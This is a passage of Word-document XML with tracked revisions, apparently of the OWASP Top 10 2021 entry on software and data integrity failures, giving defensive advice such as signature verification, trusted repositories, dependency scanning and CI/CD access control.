          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2933" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>potentially upload their own updates to be distributed and run on all</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="018BEAD0" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2934" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2935" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">installations. Another example is </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>where</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
      </w:ins>
    </w:p>
    <w:p w14:paraId="6FBBE8E8" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2936" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2937" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>objects or data are encoded or serialized into a structure that an</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="16E2EF1A" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2938" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2939" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>attacker can see and modify is vulnerable to insecure deserialization.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="1AFB7703" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2940" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3C117B44" w14:textId="6EA8CB00" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">## How </w:t>
      </w:r>
      <w:del w:id="2941" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>To</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2942" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>to</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Prevent</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C80C160" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="2943" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2944" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>The only safe architectural pattern is not to accept serialized objects from untrusted sources or to use serialization mediums that only permit primitive data types.</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="52875BD0" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="2945" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2946" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>If that is not possible, consider one of more of the following:</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="1316B9DB" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="2947" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2948" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve">* Implementing integrity checks such as </w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2949" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-   Use </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">digital signatures </w:t>
      </w:r>
      <w:del w:id="2950" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>on any serialized objects to prevent hostile object creation</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2951" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>or similar mechanisms to verify the software</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> or data </w:t>
      </w:r>
      <w:del w:id="2952" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>tampering.</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="05B2BCFE" w14:textId="071DB8CF" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00E13797" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2953" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve">* Enforcing strict type constraints during deserialization before object creation as the code typically expects a definable set of classes. Bypasses to this technique have </w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2954" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">is from the expected source and has not </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">been </w:t>
      </w:r>
      <w:del w:id="2955" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>demonstrated, so reliance solely on this is not advisable</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2956" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>altered</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35091538" w14:textId="1A477F72" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00E13797" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2957" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2958" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* Isolating</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="43F0EC44" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00841D1E" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="2959" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2960" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-   Ensure libraries</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:del w:id="2961" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>running code that deserializes in low privilege environments when possible.</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="387FE0FB" w14:textId="0F958812" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00E13797" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2962" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* Log deserialization exceptions and failures</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2963" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>dependencies</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, such as </w:t>
      </w:r>
      <w:del w:id="2964" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>where the incoming type is not the expected type,</w:delText>
        </w:r>
      </w:del>
      <w:proofErr w:type="spellStart"/>
      <w:ins w:id="2965" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>npm</w:t>
        </w:r>
      </w:ins>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:del w:id="2966" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>the deserialization throws exceptions.</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2967" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Maven, are</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="7691D4AE" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="2968" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2969" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* Restricting or monitoring incoming and outgoing network connectivity from containers or servers that deserialize.</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="5399159D" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="2970" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2971" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* Monitoring deserialization, alerting if a user deserializes constantly.</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="1CE6DCA5" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2972" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2973" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    consuming trusted repositories. If you have a higher risk profile, consider hosting an internal known-good repository that's vetted.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="5FAB6927" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2974" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4DEDD462" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2975" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2976" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-   Ensure that a software supply chain security tool, such as OWASP</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="37F99DED" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2977" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2978" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    Dependency Check or OWASP </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>CycloneDX</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>, is used to verify that</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="7E2C5D44" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2979" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2980" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    components do not contain known vulnerabilities</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0703078C" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2981" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1A45337E" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2982" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2983" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-   Ensure that there is a review process for code and configuration changes to minimize the chance that malicious code or configuration could be introduced into your software pipeline.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="6BD53400" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2984" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6D38CBEC" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2985" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2986" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-   Ensure that your CI/CD pipeline has proper segregation, configuration, and access</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="36F41A8A" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2987" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2988" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    control to ensure the integrity of the code flowing through the</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="4DAAF912" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2989" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2990" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    build and deploy processes.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="332218AF" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2991" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
